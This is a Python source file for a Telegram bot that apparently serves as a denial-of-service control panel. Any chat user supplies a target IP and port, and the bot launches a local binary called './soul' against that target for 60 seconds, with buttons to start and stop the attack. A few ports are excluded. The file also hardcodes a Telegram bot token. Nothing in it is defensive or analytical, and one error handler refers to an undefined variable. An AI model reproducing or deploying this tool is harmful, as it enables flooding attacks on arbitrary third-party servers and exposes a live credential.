import telebot
import logging
import subprocess
import threading
import os
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = '8827891490:AAFMQllSddCUE-jKwZJA2HXAvV0HKDo_LEk'

bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}

if os.path.exists('./soul'):
    os.chmod('./soul', 0o755)

def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[(user_id, target_ip, target_port)] = process.pid
        elif action == 2:
            pid = active_attacks.pop((user_id, target_ip, target_port), None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
    except Exception as e:
        logging.error(f"Error in run_attack_command_sync: {e}")
        send_main_buttons(message.chat.id,0)
        
        
def send_main_buttons(chat_id, action):
    markup = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True, one_time_keyboard=True)
    
    if action == 0:
        markup.add(KeyboardButton("Attack"))
    elif action == 1:
        markup.add(KeyboardButton("Start Attack 🚀"))
    elif action == 2:
        markup.add(KeyboardButton("Stop Attack"))
        
    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')


@bot.message_handler(func=lambda message: message.text == "Attack") #commands=['Attack'])
def attack_command(message):

    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        send_main_buttons(message.chat.id,1)
    except Exception as e:
        bot.send_message(message.chat.id, "*shi se add kro na *", parse_mode='Markdown')
        send_main_buttons(message.chat.id, 0)
        logging.error(f"Error in processing attack IP and port: {e}")

        

@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
def start_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 1)
        bot.send_message(message.chat.id, f"*Attack started on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
        send_main_buttons(message.chat.id,2)
    else:
        bot.send_message(message.chat.id, "*No target specified. Use /Attack to set it up.*", parse_mode='Markdown')
        send_main_buttons(message.chat.id,0)
        
@bot.message_handler(func=lambda message: message.text == "Stop Attack")
def stop_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 2)
        bot.send_message(message.chat.id, f"*Attack stopped on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
        user_attack_details.pop(message.from_user.id, None)
    else:
        bot.send_message(message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')
    
    send_main_buttons(message.chat.id,0)
    
@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message.chat.id,0)

if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.polling(none_stop=True)
